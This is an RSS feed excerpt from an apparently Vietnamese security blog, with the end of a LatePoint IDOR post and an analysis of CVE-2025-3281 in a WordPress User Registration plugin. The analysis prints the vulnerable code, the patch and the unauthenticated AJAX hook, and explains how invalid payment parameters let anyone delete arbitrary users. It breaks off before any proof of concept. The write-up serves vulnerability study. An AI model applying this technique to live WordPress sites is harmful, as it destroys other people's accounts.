0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE‑2025‑3769 xuất phát từ việc thiếu kiểm tra quyền sở hữu dữ liệu trong các action của OsCustomerCabinetController. Người dùng có session hợp lệ có thể truy cập booking của người khác. Bản vá 5.1.93 đã kiểm tra customer_id trước khi trả dữ liệu, ngăn chặn IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication không đồng nghĩa với Authorization.&lt;/li&gt;&#xA;&lt;li&gt;Không nên tin tưởng dữ liệu client gửi lên (ID, route, params).&lt;/li&gt;&#xA;&lt;li&gt;Luôn kiểm tra ownership ở tầng business logic.&lt;/li&gt;&#xA;&lt;li&gt;Dynamic routing cần kiểm soát chặt quyền truy cập.&lt;/li&gt;&#xA;&lt;li&gt;IDOR xảy ra khi thiếu kiểm tra mối quan hệ user–object.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-92-unauthenticated-insecure-direct-object-reference-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LatePoint Plugin &amp;lt;= 5.1.92 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;  h&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3281 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/</link>
      <pubDate>Thu, 25 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-25-cve-2025-3281/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;User Registration &amp;amp; Membership – Custom Registration Form, Login Form, and User Profile&lt;/strong&gt; cho WordPress bị &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản từ trước đến &lt;strong&gt;4.2.1&lt;/strong&gt;, thông qua hàm &lt;code&gt;create_stripe_subscription()&lt;/code&gt;, do &lt;strong&gt;thiếu kiểm tra hợp lệ đối với khóa &lt;code&gt;member_id&lt;/code&gt; do người dùng kiểm soát&lt;/strong&gt;.&#xA;Điều này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;xóa tài khoản người dùng bất kỳ&lt;/strong&gt; đã đăng ký thông qua plugin này.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3281&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3281&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;User Registration&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Theo mô tả của CVE, lỗ hổng nằm trong hàm &lt;code&gt;create_stripe_subscription()&lt;/code&gt; của plugin. Hàm này xử lý việc tạo subscription Stripe cho người dùng sau khi đăng ký.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_stripe_subscription() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_membership_confirm_payment&amp;#39; );&#xA;    $customer_id       = isset( $_POST[&amp;#39;customer_id&amp;#39;] ) ? $_POST[&amp;#39;customer_id&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $payment_method_id = isset( $_POST[&amp;#39;payment_method_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;payment_method_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $member_id         = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) ); &#xA;&#xA;    $is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;    if ( ! $is_user_created ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid Request.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $stripe_service      = new StripeService();&#xA;    $form_response       = isset( $_POST[&amp;#39;form_response&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;form_response&amp;#39;] ), true ) : array();&#xA;    $stripe_subscription = $stripe_service-&amp;gt;create_subscription( $customer_id, $payment_method_id, $member_id );&#xA;&#xA;    if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;        wp_send_json_success( $stripe_subscription );&#xA;    } else {&#xA;        wp_delete_user( absint( $member_id ) );&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện check nonce bằng cách gọi &lt;code&gt;ur_membership_verify_nonce( &#39;ur_membership_confirm_payment&#39; );&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search với từ khóa &lt;code&gt;ur_membership_confirm_payment&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;639&#34; width=&#34;1645&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;nonce được tạo với key là &lt;code&gt;_confirm_payment_nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Key và value này được thêm trong endpoint &lt;code&gt;/membership-registration/?&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/value.png&#39; alt=&#34;Value&#34; height=&#34;442&#34; width=&#34;1541&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ở đầu hàm, dữ liệu được lấy trực tiếp từ &lt;code&gt;$_POST&lt;/code&gt;, bao gồm &lt;code&gt;customer_id&lt;/code&gt;, &lt;code&gt;payment_method_id&lt;/code&gt; và đặc biệt là &lt;code&gt;member_id&lt;/code&gt; được lấy trực tiếp từ request mà không có cơ chế xác thực quyền sở hữu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member_id = absint( wp_unslash( $_POST[&amp;#39;member_id&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiếp theo, hàm kiểm tra xem user tương ứng với &lt;code&gt;member_id&lt;/code&gt; có meta &lt;code&gt;urm_user_just_created&lt;/code&gt; hay không:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$is_user_created = get_user_meta( $member_id, &amp;#39;urm_user_just_created&amp;#39; );&#xA;if ( ! $is_user_created ) {&#xA;    wp_send_json_error( ... );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là chỉ cần user đó từng được tạo thông qua luồng đăng ký của plugin thì điều kiện sẽ hợp lệ, &lt;strong&gt;không hề kiểm tra xem người gửi request có quyền thao tác trên user này hay không&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Cần lưu ý rằng user phải được đăng ký thông qua form &lt;code&gt;Registration&lt;/code&gt; tại &lt;a href=&#34;http://localhost/registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/registration/&lt;/a&gt;, chứ không phải qua &lt;code&gt;Membership Registration&lt;/code&gt; tại &lt;a href=&#34;http://localhost/membership-registration/?&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/membership-registration/?&lt;/a&gt; thì &lt;code&gt;$is_user_created&lt;/code&gt; mới thực sự có giá trị.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Sau đó, hàm gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$stripe_subscription = $stripe_service-&amp;gt;create_subscription(&#xA;    $customer_id,&#xA;    $payment_method_id,&#xA;    $member_id&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị trả về của hàm này quyết định luồng xử lý tiếp theo. Nếu &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; là &lt;code&gt;false&lt;/code&gt;, đoạn code tiếp theo sẽ xóa user tương ứng với &lt;code&gt;$member_id&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $stripe_subscription[&amp;#39;status&amp;#39;] ) {&#xA;    wp_send_json_success( $stripe_subscription );&#xA;} else {&#xA;    wp_delete_user( absint( $member_id ) );&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#34;Something went wrong when updating users payment status&amp;#34; )&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Để khiến &lt;code&gt;$stripe_subscription[&#39;status&#39;]&lt;/code&gt; trở thành &lt;code&gt;false&lt;/code&gt;, ta có thể &lt;strong&gt;truyền thiếu hoặc gửi giá trị không hợp lệ cho &lt;code&gt;$customer_id&lt;/code&gt; và &lt;code&gt;$payment_method_id&lt;/code&gt;&lt;/strong&gt;, từ đó kiểm soát kết quả trả về. Việc thiếu các tham số này sẽ khiến hàm &lt;code&gt;create_subscription()&lt;/code&gt; không thể tạo subscription hợp lệ, dẫn đến nhánh xử lý lỗi được kích hoạt.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Điều này dẫn đến lỗ hổng &lt;strong&gt;IDOR (Insecure Direct Object Reference)&lt;/strong&gt; nghiêm trọng, cho phép xóa tài khoản người dùng một cách trái phép.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;code&gt;v4.2.2&lt;/code&gt; bổ sung &lt;strong&gt;kiểm tra quyền trước khi thao tác trên user&lt;/strong&gt; để ngăn lỗ hổng IDOR:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_user&amp;#39;, $member_id ) ) {&#xA;&#x9;wp_send_json_error(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Trước khi gọi &lt;code&gt;$stripe_service-&amp;gt;create_subscription()&lt;/code&gt;, hàm sẽ xác thực xem &lt;strong&gt;người gửi request có quyền chỉnh sửa user với &lt;code&gt;member_id&lt;/code&gt; hay không&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không có quyền → trả về lỗi JSON và &lt;strong&gt;không thực hiện xóa user&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#34; title=&#34;Sự thay đổi trong bản vá&#34; data-thumbnail=&#34;/posts/2025-12-25-cve-2025-3281/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi trong bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-25-cve-2025-3281/diff.png&#39; alt=&#34;Diff&#34; height=&#34;847&#34; width=&#34;1795&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi trong bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này đảm bảo rằng chỉ user hợp lệ mới có thể trigger các thao tác dẫn đến &lt;code&gt;wp_delete_user()&lt;/code&gt;, &lt;strong&gt;đóng lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Tính năng MemberShip mặc định không được bật. bạn cần phải truy cập &lt;a href=&#34;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;http://localhost/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/a&gt; để bật nó lên.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;Plugin đã đăng ký một loạt các action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong danh sách &lt;code&gt;$ajax_events&lt;/code&gt;, action &lt;strong&gt;&lt;code&gt;create_stripe_subscription&lt;/code&gt;&lt;/strong&gt; được đánh dấu &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này có nghĩa là plugin đăng ký cả:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_create_stripe_subscription&#xA;wp_ajax_nopriv_user_registration_membership_create_stripe_subscription&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; → cho người dùng đã đăng nhập&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; → cho người dùng &lt;strong&gt;chưa đăng nhập (unauthenticated)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Vì vậy, &lt;strong&gt;bất kỳ ai cũng có thể gửi request tới endpoint này&lt;/strong&gt;, kể cả attacker chưa xác thực. Khi request được gửi:&lt;/p&gt;&#xA;&lt;p&gt;Kết quả là action &lt;code&gt;create_stripe_subscription&lt;/code&gt; trở thành &lt;strong&gt;điểm khai thác IDOR&lt;/strong&gt;, cho phép &lt;strong&gt;xóa 